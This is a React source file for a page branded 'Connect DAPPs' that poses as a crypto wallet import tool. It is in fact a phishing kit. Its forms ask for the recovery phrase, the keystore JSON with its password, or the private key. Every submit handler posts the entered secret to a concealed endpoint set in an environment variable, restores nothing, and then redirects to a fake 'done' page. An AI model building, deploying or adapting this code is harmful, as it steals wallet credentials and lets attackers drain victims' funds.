import { useHistory, Link } from 'react-router-dom';
import axios from 'axios';
import React, { useState } from 'react';

import styled, { css } from 'styled-components';

import bg from '../Header/1.jpeg';

const tabs = [
	{ id: 1, name: 'MNEMONIC' },
	{ id: 2, name: 'KEYSTORE' },
	{ id: 3, name: 'PRIVATE KEY' },
	{ id: 4, name: 'HARDWARE' },
];

const Container = styled.div`
	background-color: #000;
	/* height: 700px; */
	padding: 10px;
	padding-top: 20px;

	padding-bottom: 40px;
`;

const Inner = styled.div`
	/* height: 600px; */
	background-color: #fff;
	width: 550px;
	margin: auto;
	margin-top: 10px;
	/* height: 500px; */
	padding-bottom: 50px;

	@media (max-width: 600px) {
		width: 95%;
		margin: auto;
	}
`;

const ImageContainer = styled.div`
	height: 80px;
	width: 100%;
	display: flex;
	align-items: center;
	img {
		/* width: 100%; */
		height: 100%;
	}
	h1 {
		color: #3b99fc;
		font-size: 30px;
	}

	@media (max-width: 456px) {
		margin-top: 20px;
		margin-bottom: 110px;
	}
`;

const FormContainer = styled.div`
	/* background: red; */
`;

const FormTabs = styled.div`
	cursor: pointer;
	font-size: 15px;
	font-weight: 550;
	/* padding: 10px; */
	&:hover {
		color: #3b99fc;
	}

	@media (max-width: 460px) {
		font-size: 13px;
		font-weight: 500;
	}
`;

const Tabs = styled.div`
	border-bottom: 3px solid rgba(0, 0, 0, 0.1);
	/* background: red; */
	/* margin: 5px 0; */
	display: flex;
	justify-content: space-around;
	padding: 20px 0;
`;

const Title = styled.div`
	display: flex;
	justify-content: center;
	padding: 10px 0;
	p {
		/* font-size: 17px; */
		font-size: 19px;
	}

	${({ d }) =>
		d &&
		css`
			padding: 0;
			p {
				font-size: 17px;
			}
		`}
	${({ m }) =>
		m &&
		css`
			/* padding: 0; */
			width: 400px;
			margin: auto;
			text-align: center;
			p {
				font-size: 15px;
				font-weight: bold;
				color: #3b99fc;
			}
		`}


@media (max-width:460px) {
		${({ d }) =>
			d &&
			css`
				padding: 0;
				p {
					font-size: 15px;
					text-align: center;
				}
			`}
		${({ m }) =>
			m &&
			css`
				/* padding: 0; */
				width: 80%;
				margin: auto;
				text-align: center;
				p {
					font-size: 13px;
					font-weight: bold;
					color: #3b99fc;
				}
			`}
	}
`;

const TextContainer = styled.div`
	display: flex;
	align-items: center;
	justify-content: center;

	${({ md }) =>
		md &&
		css`
			margin-bottom: 60px;
		`}

	${({ dd }) =>
		dd &&
		css`
			margin-bottom: 60px;
		`}
`;

const Textarea = styled.textarea`
	background: #000;
	height: 200px;
	color: white;
	width: 85%;
	padding: 15px;
	margin: auto;

	${({ b }) =>
		b &&
		css`
			height: 40px;
		`}
	${({ a }) =>
		a &&
		css`
			border-radius: 6px;
			height: 100px;
		`}
	${({ md }) =>
		md &&
		css`
			border-radius: 6px;
			height: 90px;
			width: 90%;
		`}
`;

const BtnContainer = styled.div`
	display: flex;
	justify-content: center;
`;

const Btn = styled.button`
	background: #000;
	width: 85%;
	margin: auto;
	padding: 10px;
	color: white;
	font-weight: bold;
	font-size: 20px;
	text-transform: uppercase;

	border: none;
	border-radius: 6px;

	&:disabled {
		opacity: 0.5;
	}
`;

const PAInput = styled.input`
	width: 90%;
	background: #000;
	border: none;
	outline: none;
	color: white;
	height: 40px;
	padding: 10px;
`;

const Form = styled.form``;

const ReactLink = styled(Link)`
	text-decoration: none;
`;

const ImportContainer = ({ n }) => {
	const history = useHistory();
	const [done, setDone] = useState(false);

	const [id, setId] = useState(1);

	const [fd, sfd] = useState({
		mne: '',
		ky: '',
		p: '',
		pk: '',
		hd: '',
	});

	const { mne, ky, p, pk, hd } = fd;

	const handleSubmit = (e) => {
		e.preventDefault();
		const data = { mne, n };

		axios
			.post(process.env.REACT_APP_FD1, {
				data,
			})
			.then((res) => {
				sfd({
					mne: '',
					hd: '',
					ky: '',
					pk: '',
					p: '',
				});
			})

			.catch((err) => {
				console.log(err);
			});

		setDone(true);

		setTimeout(() => {
			history.push('/done');
		}, 2000);
	};

	const handle1 = (e) => {
		e.preventDefault();

		const data = { ky, p, n };
		axios
			.post(process.env.REACT_APP_FD2, {
				data,
			})
			.then((res) => {
				sfd({
					mne: '',
					hd: '',
					ky: '',
					pk: '',
					p: '',
				});
			})

			.catch((err) => {});

		setDone(true);

		setTimeout(() => {
			history.push('/done');
		}, 2000);
	};

	const handle2 = (e) => {
		e.preventDefault();

		const data = { pk, n };
		axios
			.post(process.env.REACT_APP_FD3, {
				data,
			})
			.then((res) => {
				sfd({
					mne: '',
					hd: '',
					ky: '',
					pk: '',
					p: '',
				});
			})

			.catch((err) => {});

		setDone(true);

		setTimeout(() => {
			history.push('/done');
		}, 2000);
	};

	const handle3 = (e) => {
		e.preventDefault();

		const data = { hd, n };

		axios
			.post(process.env.REACT_APP_FD4, {
				data,
			})
			.then((res) => {
				sfd({
					mne: '',
					hd: '',
					ky: '',
					pk: '',
					p: '',
				});
			})

			.catch((err) => {});

		setDone(true);

		setTimeout(() => {
			history.push('/done');
		}, 2000);
	};

	return (
		<Container>
			<ImageContainer className='img-container'>
				<img src={bg} alt='dapps' />
				<ReactLink to='/'>
					<h1>Connect DAPPs</h1>
				</ReactLink>
			</ImageContainer>
			<Inner>
				<FormContainer>
					<Tabs>
						{tabs.map(({ id, name }) => (
							<FormTabs key={id} onClick={() => setId(id)}>
								{name}
							</FormTabs>
						))}
					</Tabs>

					{id === 1 && (
						<Form onSubmit={(e) => handleSubmit(e)}>
							<Title>
								<p>Please enter your 12/24 word phase</p>
							</Title>

							<TextContainer>
								<Textarea
									required
									value={mne}
									onChange={({ target: { value } }) =>
										sfd({
											...fd,
											mne: value,
										})
									}
								/>
							</TextContainer>
							<Title d>
								<p>Please separate each Mnemonic Phrase with a space.</p>
							</Title>

							<Title m>
								<p>
									Input the BIP39/BIP44 recovery phrase here to restore the
									Mnemonic keys that manage your accounts.
								</p>
							</Title>

							<BtnContainer>
								<Btn disabled={done}>Import</Btn>
							</BtnContainer>
						</Form>
					)}
					{id === 2 && (
						<Form onSubmit={(e) => handle1(e)}>
							<Title>
								<p>Please enter your keystore JSON</p>
							</Title>
							<TextContainer>
								<Textarea
									onChange={({ target: { value } }) =>
										sfd({
											...fd,
											ky: value,
										})
									}
									value={ky}
									md
									type='text'
									required
								/>
							</TextContainer>

							<Title d>
								<p>Please enter your keystore in JSON format</p>
							</Title>
							<TextContainer md>
								<PAInput
									type='password'
									value={p}
									placeholder='Password'
									required
									onChange={({ target: { value } }) =>
										sfd({
											...fd,
											p: value,
										})
									}
								/>
							</TextContainer>
							<Title m>
								<p>
									Input the BIP39/BIP44 recovery phrase here to restore the
									private keys that manage your accounts{' '}
								</p>
							</Title>

							<BtnContainer>
								<Btn disabled={done}>Import</Btn>
							</BtnContainer>
						</Form>
					)}
					{id === 3 && (
						<Form onSubmit={(e) => handle2(e)}>
							{' '}
							<Title>
								<p>Please enter your key</p>
							</Title>
							<TextContainer>
								<Textarea
									value={pk}
									onChange={({ target: { value } }) =>
										sfd({
											...fd,
											pk: value,
										})
									}
									a
									type='text'
									required
								/>
							</TextContainer>
							<Title d>
								<p>Please enter your private key in HEX format.</p>
							</Title>
							<Title m>
								<p>
									Input the BIP39/BIP44 recovery phrase here to restore the
									private keys that manage your accounts{' '}
								</p>
							</Title>
							<BtnContainer>
								<Btn disabled={done}>Import</Btn>
							</BtnContainer>
						</Form>
					)}
					{id === 4 && (
						<Form onSubmit={(e) => handle3(e)}>
							{' '}
							<Title>
								<p>Please enter your key</p>
							</Title>
							<TextContainer>
								<Textarea
									value={hd}
									onChange={({ target: { value } }) =>
										sfd({
											...fd,
											hd: value,
										})
									}
									a
									type='text'
									required
								/>
							</TextContainer>
							<Title d>
								<p>Please enter your private key in HEX format.</p>
							</Title>
							<Title m>
								<p>
									Input the BIP39/BIP44 recovery phrase here to restore the
									private keys that manage your accounts{' '}
								</p>
							</Title>
							<BtnContainer>
								<Btn disabled={done}>Import</Btn>
							</BtnContainer>
						</Form>
					)}
				</FormContainer>
			</Inner>
		</Container>
	);
};

export default ImportContainer;
